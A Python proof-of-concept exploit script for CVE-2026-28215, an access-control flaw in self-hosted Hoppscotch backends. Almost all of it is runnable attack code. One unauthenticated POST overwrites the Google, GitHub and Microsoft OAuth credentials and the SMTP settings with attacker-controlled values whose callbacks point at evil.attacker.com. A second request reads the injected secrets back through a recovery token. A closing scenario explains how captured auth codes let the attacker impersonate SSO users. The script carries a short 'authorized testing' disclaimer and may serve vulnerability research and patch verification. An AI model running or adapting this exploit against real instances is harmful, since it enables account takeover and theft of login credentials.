#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Hoppscotch Onboarding Bypass — OAuth Credential Hijacking
# CVE            : CVE-2026-28215
# Vendor         : Hoppscotch
# Product        : Hoppscotch Self-Hosted Backend
# Affected       : < 2026.2.0
# Type           : CWE-284 - Improper Access Control
# CVSS           : 9.1 (Critical)
# Platform       : Node.js / Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-02-28
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2026-28215 Vector 2: OAuth Credential Hijacking

Overwrites OAuth provider credentials (Google, GitHub, Microsoft) with
attacker-controlled values. Redirects all SSO login flows through attacker
infrastructure, capturing OAuth tokens.

ATTACK CHAIN:
  1. POST /v1/onboarding/config with attacker OAuth client IDs/secrets/callbacks
  2. All three OAuth providers (Google, GitHub, Microsoft) hijacked in one request
  3. Exfiltrate injected credentials via recovery token to verify
  4. SSO users redirected to attacker OAuth apps on next login

PREREQUISITES:
  - Hoppscotch self-hosted instance < 2026.2.0
  - Network access to backend API (default port 3170)
  - Python 3.6+ (stdlib only, no external dependencies)

REFERENCES:
  - CVE-2026-28215
  - https://github.com/hoppscotch/hoppscotch/security/advisories/GHSA-jwv8-867r-q9fg
"""
import sys
import json
import time
import http.client
import urllib.parse


RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"

DEFAULT_PORT = 3170
MAX_RETRIES = 10
RETRY_INTERVAL = 3


def http_request(host, port, method, path, body=None, headers=None, timeout=10):
    """Send an HTTP request and return (status, headers, body) tuple."""
    conn = http.client.HTTPConnection(host, port, timeout=timeout)
    try:
        if headers is None:
            headers = {}
        if body and isinstance(body, dict):
            body = json.dumps(body)
            headers["Content-Type"] = "application/json"
        conn.request(method, path, body=body, headers=headers)
        resp = conn.getresponse()
        data = resp.read().decode("utf-8", errors="replace")
        return resp.status, dict(resp.getheaders()), data
    except Exception as e:
        return None, None, str(e)
    finally:
        conn.close()


def wait_for_service(host, port, max_retries=MAX_RETRIES, interval=RETRY_INTERVAL):
    """Wait for the service to come back after restart."""
    print(f"\n{YELLOW}[*] Waiting for service to restart...{RESET}")
    for i in range(max_retries):
        time.sleep(interval)
        status, _, body = http_request(host, port, "GET", "/v1/onboarding/status")
        if status == 200:
            print(f"{GREEN}[+] Service is back online (attempt {i+1}/{max_retries}){RESET}")
            return True
    return False


def exploit(target_host, target_port):
    """Demonstrate OAuth credential hijacking via onboarding bypass."""
    print(f"""
{BOLD}{RED}╔══════════════════════════════════════════════════════════════╗
║  CVE-2026-28215 — Vector 2: OAuth Credential Hijacking     ║
║  Overwrite Google/GitHub/Microsoft OAuth with attacker creds║
╚══════════════════════════════════════════════════════════════╝{RESET}
""")
    print(f"{BOLD}Target: {target_host}:{target_port}{RESET}")
    print(f"{'═' * 60}")

    # ── Step 1: Check current status ──
    print(f"\n{BOLD}{CYAN}═══ STEP 1: Pre-exploit Status Check ═══{RESET}")
    status, _, body = http_request(target_host, target_port, "GET", "/v1/onboarding/status")
    if status != 200:
        print(f"{RED}[!] Target unreachable (status: {status}){RESET}")
        return False
    print(f"{GREEN}[+] Target status: {body}{RESET}")

    # ── Step 2: Overwrite OAuth credentials ──
    print(f"\n{BOLD}{CYAN}═══ STEP 2: OAuth Credential Overwrite ═══{RESET}")
    print(f"{YELLOW}[*] Injecting attacker-controlled OAuth credentials for ALL providers...{RESET}")

    # Attacker-controlled OAuth configuration
    # In a real attack: attacker registers OAuth apps on Google/GitHub/Microsoft
    # with redirect URIs pointing to attacker server to capture auth codes
    oauth_payload = {
        "VITE_ALLOWED_AUTH_PROVIDERS": "GOOGLE,GITHUB,MICROSOFT,EMAIL",
        # Google OAuth — attacker-controlled app
        "GOOGLE_CLIENT_ID": "attacker-google-client-id-1234567890.apps.googleusercontent.com",
        "GOOGLE_CLIENT_SECRET": "attacker-google-secret-GOCSPX-abcdef123456",
        "GOOGLE_CALLBACK_URL": "https://evil.attacker.com/auth/google/callback",
        "GOOGLE_SCOPE": "email profile",
        # GitHub OAuth — attacker-controlled app
        "GITHUB_CLIENT_ID": "attacker_github_client_id_abc123",
        "GITHUB_CLIENT_SECRET": "attacker_github_secret_xyz789",
        "GITHUB_CALLBACK_URL": "https://evil.attacker.com/auth/github/callback",
        "GITHUB_SCOPE": "user:email",
        # Microsoft OAuth — attacker-controlled app
        "MICROSOFT_CLIENT_ID": "attacker-ms-client-00000000-1111-2222-3333-444444444444",
        "MICROSOFT_CLIENT_SECRET": "attacker-ms-secret-abcdef123456",
        "MICROSOFT_CALLBACK_URL": "https://evil.attacker.com/auth/microsoft/callback",
        "MICROSOFT_SCOPE": "user.read",
        "MICROSOFT_TENANT": "common",
        # Email auth with attacker SMTP to capture magic links
        "MAILER_SMTP_ENABLE": "true",
        "MAILER_USE_CUSTOM_CONFIGS": "true",
        "MAILER_SMTP_HOST": "evil-smtp.attacker.com",
        "MAILER_SMTP_PORT": "587",
        "MAILER_SMTP_SECURE": "true",
        "MAILER_SMTP_USER": "evil@attacker.com",
        "MAILER_SMTP_PASSWORD": "evil-smtp-password!",
        "MAILER_ADDRESS_FROM": "noreply@attacker.com",
        "MAILER_TLS_REJECT_UNAUTHORIZED": "true",
    }

    print(f"\n{YELLOW}    OAuth Providers Being Hijacked:{RESET}")
    print(f"      {RED}Google:    Client → attacker-google-client-id-1234567890{RESET}")
    print(f"      {RED}           Callback → https://evil.attacker.com/auth/google/callback{RESET}")
    print(f"      {RED}GitHub:    Client → attacker_github_client_id_abc123{RESET}")
    print(f"      {RED}           Callback → https://evil.attacker.com/auth/github/callback{RESET}")
    print(f"      {RED}Microsoft: Client → attacker-ms-client-00000000-...-444444444444{RESET}")
    print(f"      {RED}           Callback → https://evil.attacker.com/auth/microsoft/callback{RESET}")

    status, _, body = http_request(target_host, target_port, "POST", "/v1/onboarding/config", body=oauth_payload)

    if status is None:
        print(f"\n{RED}[!] Connection failed: {body}{RESET}")
        return False

    print(f"\n{GREEN}[+] Response Status: {status}{RESET}")
    print(f"    Response Body: {body}")

    if status != 201:
        print(f"\n{RED}[!] Exploit failed — status {status} (expected 201).{RESET}")
        if status == 400:
            print(f"{GREEN}[*] This instance appears to be PATCHED.{RESET}")
        return False

    try:
        data = json.loads(body)
        token = data.get("token")
    except json.JSONDecodeError:
        print(f"{RED}[!] Failed to parse response.{RESET}")
        return False

    if not token:
        print(f"{RED}[!] No recovery token in response.{RESET}")
        return False

    print(f"\n{RED}{BOLD}[!!!] OAuth credentials OVERWRITTEN — Recovery token: {token}{RESET}")

    # ── Wait for restart ──
    if not wait_for_service(target_host, target_port):
        print(f"{RED}[!] Service did not restart.{RESET}")
        return False

    # ── Step 3: Verify OAuth credentials via secret exfiltration ──
    print(f"\n{BOLD}{CYAN}═══ STEP 3: Verify Injected OAuth Credentials ═══{RESET}")
    path = f"/v1/onboarding/config?token={urllib.parse.quote(token)}"
    status, _, body = http_request(target_host, target_port, "GET", path)

    if status != 200:
        print(f"{RED}[!] Secret exfiltration failed (status: {status}){RESET}")
        return False

    try:
        secrets = json.loads(body)
    except json.JSONDecodeError:
        print(f"{RED}[!] Invalid JSON in secret response.{RESET}")
        return False

    # Verify each OAuth provider was successfully overwritten
    oauth_checks = [
        ("GOOGLE_CLIENT_ID", "attacker-google-client-id-1234567890.apps.googleusercontent.com"),
        ("GOOGLE_CLIENT_SECRET", "attacker-google-secret-GOCSPX-abcdef123456"),
        ("GOOGLE_CALLBACK_URL", "https://evil.attacker.com/auth/google/callback"),
        ("GITHUB_CLIENT_ID", "attacker_github_client_id_abc123"),
        ("GITHUB_CLIENT_SECRET", "attacker_github_secret_xyz789"),
        ("GITHUB_CALLBACK_URL", "https://evil.attacker.com/auth/github/callback"),
        ("MICROSOFT_CLIENT_ID", "attacker-ms-client-00000000-1111-2222-3333-444444444444"),
        ("MICROSOFT_CLIENT_SECRET", "attacker-ms-secret-abcdef123456"),
        ("MICROSOFT_CALLBACK_URL", "https://evil.attacker.com/auth/microsoft/callback"),
    ]

    all_verified = True
    print(f"\n{RED}{BOLD}[!!!] EXFILTRATED OAUTH CREDENTIALS:{RESET}")
    print(f"{RED}{'─' * 60}{RESET}")
    for key, expected in oauth_checks:
        actual = secrets.get(key, "")
        if actual == expected:
            print(f"  {GREEN}✓{RESET} {key}: {RED}{BOLD}{actual}{RESET}")
        else:
            print(f"  {RED}✗ {key}: expected '{expected}', got '{actual}'{RESET}")
            all_verified = False
    print(f"{RED}{'─' * 60}{RESET}")

    # ── Summary ──
    print(f"\n{'═' * 60}")
    if all_verified:
        print(f"""
{GREEN}{BOLD}[+] VECTOR 2 CONFIRMED — OAuth Credential Hijacking{RESET}

{BOLD}Attack scenario:{RESET}
  1. Attacker registers rogue OAuth apps (Google, GitHub, Microsoft)
     with callback URLs pointing to https://evil.attacker.com/
  2. Attacker sends single unauthenticated POST to overwrite OAuth config
  3. All SSO login buttons now redirect users to attacker's OAuth apps
  4. Attacker captures OAuth authorization codes at their callback URL
  5. With auth codes, attacker can impersonate any user logging via SSO

{BOLD}All 3 OAuth providers + SMTP successfully hijacked in a single request.{RESET}
""")
        return True
    else:
        print(f"\n{YELLOW}[*] Partial success — some OAuth fields were not overwritten correctly.{RESET}")
        return False


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "localhost"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT

    try:
        result = exploit(target, port)
        sys.exit(0 if result else 1)
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[*] Interrupted.{RESET}")
        sys.exit(130)
    except Exception as e:
        print(f"\n{RED}[!] Error: {e}{RESET}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
